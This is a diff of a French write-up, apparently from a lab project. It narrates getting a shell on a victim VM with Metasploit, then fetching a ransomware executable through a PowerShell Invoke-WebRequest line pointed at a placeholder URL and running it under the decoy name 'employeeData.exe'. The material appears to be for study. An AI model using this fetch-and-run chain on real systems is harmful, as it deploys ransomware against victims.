@@ -255,8 +255,12 @@ On voit alors qu'en bas de notre "show options", il y'a les détails de l'exploi
 Nous avons configuré toutes les options obligatoires, il ne nous reste plus qu'à exploiter la faille avec la commande
 '''exploit'''
 
-Nous avons alors accès à la console de la victime. Il reste à télécharger le ransomware depuis un lien ou nous l'avons publié (pour moi, sur Filetransfer) depuis l'invité de commande. Pour cela, 
-'''
+Nous avons alors accès à la console de la victime. Il reste à télécharger le ransomware depuis un lien ou nous l'avons publié (pour moi, sur Filetransfer) depuis l'invité de commande. Je n'ai pas trouvé de moyen simple de télécharger le fichier depuis Internet puisqu'il faut toujours installer un outil pour télécharger depuis l'invite de commande.
+Le moyen le plus efficace pour moi est de passer par le Powershell, pour cela on execute les commandes suivantes:
+
+"powershell -c "Invoke-WebRequest -Uri 'https://www.website.com/fichier.exe' -OutFile 'C:\Users\vboxuser\Desktop'""
+
+Ensuite, il ne reste plus qu'à se rendre dans le répertoire "Desktop" avec l'invité de commande et à executer le fichier avec '''./employeeData.exe'''
 
 ## Difficultés rencontrées
 - J'ai rencontré des difficultés à déchiffrer le fichier. Le fichier déchiffré était vide, j'ai passé beaucoup d'heures à trouver d'ou venait le problème.
